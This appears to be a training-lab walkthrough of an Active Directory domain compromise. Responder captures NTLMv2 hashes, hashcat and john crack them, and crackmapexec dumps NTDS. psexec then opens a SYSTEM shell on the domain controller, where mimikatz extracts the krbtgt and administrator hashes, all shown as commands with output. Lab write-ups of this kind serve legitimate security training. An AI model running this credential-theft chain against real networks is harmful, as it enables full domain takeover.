Connect with xfreerdp with the given credentials (htb-student:HTB_@cademy_stdnt!). With responder we can catch some hashes to crack

```bash
┌─[htb-student@par01]─[~]
└──╼ $sudo responder -I ens224 -wrfv                                                                                
[...SNIP...]

[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\backupagent
[SMB] NTLMv2-SSP Hash     : backupagent::INLANEFREIGHT:248f77cdd24d54d3:508BC059CD7717B7AEE100E7F29EB819:010100000000000000CBB5ED5221DA01416815D610105D97000000000200080050004C004F00420001001E00570049004E002D004500540056003300410053005100440046004B00390004003400570049004E002D004500540056003300410053005100440046004B0039002E0050004C004F0042002E004C004F00430041004C000300140050004C004F0042002E004C004F00430041004C000500140050004C004F0042002E004C004F00430041004C000700080000CBB5ED5221DA0106000400020000000800300030000000000000000000000000300000CD638CEE291638EA083B4952006FDF0B8403B263035DCE09D820770ED2A331990A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000

[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\svc_qualys
[SMB] NTLMv2-SSP Hash     : svc_qualys::INLANEFREIGHT:3afac13ae3ad05fe:D6EDB4D34E7A703C2E85505C2C29E5DD:010100000000000000CBB5ED5221DA01ECCA35579D23331B000000000200080050004C004F00420001001E00570049004E002D004500540056003300410053005100440046004B00390004003400570049004E002D004500540056003300410053005100440046004B0039002E0050004C004F0042002E004C004F00430041004C000300140050004C004F0042002E004C004F00430041004C000500140050004C004F0042002E004C004F00430041004C000700080000CBB5ED5221DA0106000400020000000800300030000000000000000000000000300000CD638CEE291638EA083B4952006FDF0B8403B263035DCE09D820770ED2A331990A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000

[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\netmonitor
[SMB] NTLMv2-SSP Hash     : netmonitor::INLANEFREIGHT:4b7cf63706e25b9c:51364A887FA4869635DB645EDF3F96A2:010100000000000000CBB5ED5221DA016AA93CA59095EA98000000000200080050004C004F00420001001E00570049004E002D004500540056003300410053005100440046004B00390004003400570049004E002D004500540056003300410053005100440046004B0039002E0050004C004F0042002E004C004F00430041004C000300140050004C004F0042002E004C004F00430041004C000500140050004C004F0042002E004C004F00430041004C000700080000CBB5ED5221DA0106000400020000000800300030000000000000000000000000300000CD638CEE291638EA083B4952006FDF0B8403B263035DCE09D820770ED2A331990A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000

┌──(kali㉿kali)-[~/Documents/Academy/Documenting-and-reporting]
└─$ hashcat -m 5600 hashes /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

[...SNIP...]

SVC_QUALYS::[...SNIP...]:Security_3
BACKUPAGENT::[...SNIP...]:Recovery7
NETMONITOR::[...SNIP...]:Monitor76
```

Here with crackmapexec we can dump ntds, as we saw svc_qualys is `Domain Admin` in Bloodhound

```bash
┌─[htb-student@par01]─[~]
└──╼ $crackmapexec smb 172.16.5.130 -u svc_qualys -p Security_3 --ntds     

[...SNIP...]
INLANEFREIGHT.LOCAL\svc_qualys:Security_3 (Pwn3d!)
[...SNIP...]
```

Here we can crack the svc_reporting hash

```bash
┌──(kali㉿kali)-[~/Documents/Academy/Documenting-and-reporting]
└─$ john ntds-hash -w=/usr/share/wordlists/rockyou.txt --format=NT
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
Reporter1!       (svc_reporting)     
1g 0:00:00:00 DONE (2023-11-28 00:29) 1.515g/s 16176Kp/s 16176Kc/s 16176KC/s Requin..Renezzle
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed.
```

Now with psexec we can get a authority shell in DC

```bash
┌─[htb-student@par01]─[~]
└──╼ $impacket-psexec svc_qualys:'Security_3'@172.16.5.5

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 172.16.5.5.....
[*] Found writable share ADMIN$
[*] Uploading file pYwnyNLC.exe
[*] Opening SVCManager on 172.16.5.5.....
[*] Creating service Xwar on 172.16.5.5.....
[*] Starting service Xwar.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

Now, with mimikatz we can dump the krbtgt hash

```bash
C:\>.\mimikatz.exe
 
  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt
Domain : INLANEFREIGHT / S-1-5-21-3842939050-3880317879-2865463114

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : 16e26ba33e455a8c338142af8d89ffbc

[...SNIP...]

mimikatz # lsadump::lsa /inject /name:administrator
Domain : INLANEFREIGHT / S-1-5-21-3842939050-3880317879-2865463114

RID  : 000001f4 (500)
User : administrator

 * Primary
    NTLM : 88ad09182de639ccc6579eb0849751cf
    
[...SNIP...]   
```
